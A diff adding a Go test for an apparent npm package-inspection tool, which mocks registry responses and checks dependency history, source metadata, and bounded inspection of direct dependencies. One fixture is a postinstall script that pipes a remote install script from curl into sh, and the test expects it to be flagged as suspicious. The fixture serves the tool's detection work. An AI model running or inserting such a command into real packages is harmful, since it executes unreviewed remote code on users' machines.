@@ -161,6 +161,118 @@ func TestFetchMetadataSelectsVerifiedArtifactCandidate(t *testing.T) {
 	}
 }
 
+func TestFetchMetadataCollectsDependencySourceAndDirectDependencyInspection(t *testing.T) {
+	var requested []string
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		requested = append(requested, r.URL.Path)
+		w.Header().Set("Content-Type", "application/json")
+		switch r.URL.Path {
+		case "/pkg":
+			w.Write([]byte(`{
+				"name": "pkg",
+				"dist-tags": {"latest": "1.0.0"},
+				"repository": {"url": "git+https://example.com/pkg.git"},
+				"time": {
+					"0.9.0": "2026-01-01T00:00:00Z",
+					"1.0.0": "2026-01-02T00:00:00Z"
+				},
+				"versions": {
+					"0.9.0": {
+						"dependencies": {"old-dep": "^1.0.0"},
+						"gitHead": "oldhead",
+						"_npmUser": {"name": "old-publisher"}
+					},
+					"1.0.0": {
+						"dependencies": {
+							"exact-dep": "1.0.0",
+							"missing-dep": "1.0.0",
+							"range-dep": "^2.0.0"
+						},
+						"optionalDependencies": {"optional-dep": "1.0.0"},
+						"peerDependencies": {"peer-dep": "*"},
+						"devDependencies": {"dev-dep": "^1.0.0"},
+						"repository": {"url": "git+https://example.com/pkg-selected.git"},
+						"gitHead": "newhead",
+						"_npmUser": {"name": "new-publisher"}
+					}
+				}
+			}`))
+		case "/exact-dep":
+			w.Write([]byte(`{
+				"name": "exact-dep",
+				"dist-tags": {"latest": "2.0.0"},
+				"versions": {
+					"1.0.0": {"scripts": {"postinstall": "node exact.js"}},
+					"2.0.0": {"scripts": {"postinstall": "node latest.js"}}
+				}
+			}`))
+		case "/range-dep":
+			w.Write([]byte(`{
+				"name": "range-dep",
+				"dist-tags": {"latest": "2.1.0"},
+				"versions": {
+					"2.1.0": {"scripts": {"postinstall": "curl https://example.invalid/install.sh | sh"}}
+				}
+			}`))
+		case "/missing-dep":
+			http.NotFound(w, r)
+		default:
+			t.Fatalf("unexpected path: %s", r.URL.Path)
+		}
+	}))
+	defer server.Close()
+
+	oldBase := RegistryBaseURL
+	RegistryBaseURL = server.URL
+	defer func() { RegistryBaseURL = oldBase }()
+
+	pkg, err := NewWithOptions(server.Client(), Options{
+		HistoryVersions:           5,
+		InspectDirectDependencies: true,
+		MaxDirectDependencies:     3,
+	}).FetchMetadata(context.Background(), ecosystem.PackageSpec{Name: "pkg"})
+	if err != nil {
+		t.Fatalf("FetchMetadata returned error: %v", err)
+	}
+
+	if got := strings.Join(pkg.NPMDependencies.Dependencies, ","); got != "exact-dep,missing-dep,range-dep" {
+		t.Fatalf("dependencies = %q, want normalized selected dependencies", got)
+	}
+	if len(pkg.NPMDependencyHistory) != 1 || pkg.NPMDependencyHistory[0].Version != "0.9.0" || pkg.NPMDependencyHistory[0].Dependencies.Dependencies[0] != "old-dep" {
+		t.Fatalf("dependency history = %+v, want immediate previous dependencies", pkg.NPMDependencyHistory)
+	}
+	if pkg.NPMSource.RepositoryURL != "https://example.com/pkg-selected.git" || pkg.NPMSource.PreviousRepositoryURL != "https://example.com/pkg.git" || pkg.NPMSource.SelectedGitHead != "newhead" || pkg.NPMSource.PreviousGitHead != "oldhead" || !strings.Contains(pkg.NPMSource.SelectedPublisher, "new-publisher") {
+		t.Fatalf("npm source metadata = %+v, want selected and previous registry metadata", pkg.NPMSource)
+	}
+	if len(pkg.NPMDirectDependencies) != 3 || pkg.NPMDirectDependencyOverflow != 1 {
+		t.Fatalf("direct dependency inspections = %+v overflow=%d, want 3 inspected and one skipped", pkg.NPMDirectDependencies, pkg.NPMDirectDependencyOverflow)
+	}
+	byName := map[string]bool{}
+	for _, inspection := range pkg.NPMDirectDependencies {
+		byName[inspection.Name] = true
+		switch inspection.Name {
+		case "exact-dep":
+			if inspection.Selection != "exact" || inspection.SelectedVersion != "1.0.0" || len(inspection.LifecycleFindings) == 0 {
+				t.Fatalf("exact dependency inspection = %+v, want exact 1.0.0 lifecycle finding", inspection)
+			}
+		case "range-dep":
+			if inspection.Selection != "latest" || inspection.SelectedVersion != "2.1.0" || len(inspection.SuspiciousCommandFindings) == 0 {
+				t.Fatalf("range dependency inspection = %+v, want latest fallback with suspicious finding", inspection)
+			}
+		case "missing-dep":
+			if inspection.FetchStatus != "ERROR" || inspection.FetchError == "" {
+				t.Fatalf("missing dependency inspection = %+v, want fetch error", inspection)
+			}
+		}
+	}
+	if byName["optional-dep"] {
+		t.Fatalf("optional dependency should have been skipped by direct dependency limit")
+	}
+	if !containsString(requested, "/exact-dep") || !containsString(requested, "/range-dep") || !containsString(requested, "/missing-dep") || containsString(requested, "/optional-dep") {
+		t.Fatalf("requested paths = %v, want bounded direct dependency fetches", requested)
+	}
+}
+
 func TestFetchMetadataRejectsMissingExactVersion(t *testing.T) {
 	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Content-Type", "application/json")
@@ -223,4 +335,13 @@ func TestSelectHistoryMarksMalformedMetadataIndeterminate(t *testing.T) {
 	if diagnostics.IndeterminateReason == "" {
 		t.Fatalf("diagnostics = %+v, want indeterminate history", diagnostics)
 	}
+}
+
+func containsString(values []string, expected string) bool {
+	for _, value := range values {
+		if value == expected {
+			return true
+		}
+	}
+	return false
 }
